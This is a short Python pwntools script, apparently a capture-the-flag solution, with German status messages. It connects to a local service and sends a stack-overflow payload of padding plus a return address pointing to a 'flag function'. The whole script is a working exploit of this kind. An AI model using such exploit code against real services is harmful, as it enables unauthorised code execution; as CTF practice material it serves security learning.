from pwn import *

TARGET_HOST = "localhost"
TARGET_PORT = 57005

print("Baue Verbindung zu %s:%d auf..." % (TARGET_HOST, TARGET_PORT))
process = remote(TARGET_HOST, TARGET_PORT)

address_flag_function = p64(0x00000000004011d2)

print("Sende Payload...")
payload = b"DBH"*24 + address_flag_function

print(process.recv())
process.sendline(payload)

print(process.recv())
print(process.recv())
